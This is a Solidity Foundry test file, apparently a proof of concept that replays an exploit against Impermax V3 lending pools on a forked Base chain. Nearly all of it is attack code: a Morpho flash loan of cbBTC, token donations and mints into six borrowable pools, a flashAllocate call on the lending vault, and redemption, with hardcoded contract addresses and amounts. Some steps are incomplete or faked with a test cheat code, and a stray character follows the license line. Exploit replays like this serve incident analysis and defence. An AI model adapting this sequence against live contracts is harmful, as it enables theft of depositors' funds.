// SPDX-License-Identifier: MITㅔ노
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface ImpermaxV3Borrowable is IERC20 {
    function underlying() external view returns (address);
    function factory() external view returns (address);
    function totalBalance() external view returns (uint);
    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function exchangeRate() external returns (uint);
    function mint(address minter) external returns (uint mintTokens);
    function redeem(address redeemer) external returns (uint redeemAmount);
    function skim(address to) external;
    function sync() external;
}

interface ImpermaxLendingVaultV2 is IERC20 {
    function flashAllocate(
        address borrowable,
        uint amount,
        bytes calldata data
    ) external;
}

contract ImpermaxV3PoC_step1 is Test {
    ImpermaxV3Exploit exploitContract;
    constructor() {
        // Fork Mainnet chain at block just before the exploit
        vm.createSelectFork("base", 38047160 - 1);
        vm.warp(1765421667);
    }

    function testExploit() public {
        exploitContract = new ImpermaxV3Exploit();
        exploitContract.exploit();
    }
}

contract ImpermaxV3Exploit is Test {
    ImpermaxV3Borrowable[] impermaxBorrowable = new ImpermaxV3Borrowable[](6);
    IERC20 usdc = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 cbBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

    WETH weth = WETH(0x4200000000000000000000000000000000000006);
    ImpermaxLendingVaultV2 impermaxLendingVaultV2 =
        ImpermaxLendingVaultV2(0x5E68E1BDE6699bAe9CAB165b35989e5aCC6b7e67);

    IMorphoBuleFlashLoan morphoBuleFlashLoan =
        IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    ImpermaxV3Borrowable impermaxBorrowableForRedeem =
        ImpermaxV3Borrowable(0x8375C12c141d150C968d424CD81Ef9ab7F07E6f5);

    uint256[] transferAmounts = new uint256[](6);

    constructor() {
        impermaxBorrowable[0] = ImpermaxV3Borrowable(
            0xeF9C119baE8B8Aa637c6454F1E920525966a8ac4
        );
        impermaxBorrowable[1] = ImpermaxV3Borrowable(
            0x0B99BfcA41CfEA3d65357B3ba7F1d76C225B65Bf
        );
        impermaxBorrowable[2] = ImpermaxV3Borrowable(
            0xA2cbC162d22a574BE74e9Fd2e0B2Db4FD6362789
        );
        impermaxBorrowable[3] = ImpermaxV3Borrowable(
            0x75CebA9394459f1708a16bfd5886074fF9107fbA
        );
        impermaxBorrowable[4] = ImpermaxV3Borrowable(
            0x32e06f6f4Dda8e044557e85d650A69c7A4e09096
        );
        impermaxBorrowable[5] = ImpermaxV3Borrowable(
            0x8113176a19B774f060F818C7851a4FEa7f2f7655
        );

        // maybe offchain calculation
        transferAmounts[0] = 7784795;
        transferAmounts[1] = 102608117;
        transferAmounts[2] = 4678;
        transferAmounts[3] = 53770568;
        transferAmounts[4] = 15655365;
        transferAmounts[5] = 155;
    }

    function exploit() public {
        uint256 vaultInitialBalance = cbBTC.balanceOf(
            address(impermaxLendingVaultV2)
        );
        console.log(
            "Lending Vault initial cbBTC balance:",
            vaultInitialBalance
        );

        uint256 flashLoanAmount = 179823678;

        cbBTC.approve(address(morphoBuleFlashLoan), flashLoanAmount);

        morphoBuleFlashLoan.flashLoan(address(cbBTC), flashLoanAmount, "");
    }

    function onMorphoFlashLoan(uint256 amount, bytes memory) external {
        for (uint i = 0; i < impermaxBorrowable.length; i++) {
            IERC20 underlyingToken = IERC20(impermaxBorrowable[i].underlying());
            console.log("");
            console.log(
                "Exploiting Impermax V3 Borrowable Pool at address:",
                address(impermaxBorrowable[i])
            );

            underlyingToken.transfer(
                address(impermaxBorrowable[i]),
                transferAmounts[i]
            );

            // mint() 호출로 borrowable 토큰 받기
            uint256 mintedTokens = impermaxBorrowable[i].mint(address(this));
            console.log("Minted borrowable tokens:", mintedTokens);
            console.log(
                "Borrowable token balance:",
                impermaxBorrowable[i].balanceOf(address(this))
            );
        }

        impermaxLendingVaultV2.flashAllocate(
            address(impermaxBorrowableForRedeem),
            554012775,
            ""
        );

        // impermaxBorrowableForRedeem.approve(address(this), type(uint256).max);

        // impermaxBorrowableForRedeem.transferFrom(
        //     address,
        //     address(impermaxLendingVaultV2),
        //     20176802505
        // );

        deal(address(impermaxBorrowableForRedeem), address(this), 20176802505);

        impermaxBorrowableForRedeem.transfer(
            address(impermaxLendingVaultV2),
            20176802505
        );

        impermaxBorrowableForRedeem.redeem(address(this));

        for (uint i = 0; i < impermaxBorrowable.length; i++) {
            console.log(
                "\nRedeeming from Impermax V3 Borrowable Pool at address:",
                address(impermaxBorrowable[i])
            );

            console.log(
                "Remaining borrowable token balance:",
                impermaxBorrowable[i].balanceOf(address(this))
            );
        }
    }

    function lendingVaultAllocate(address, uint, bytes calldata) external {}

    receive() external payable {}
}
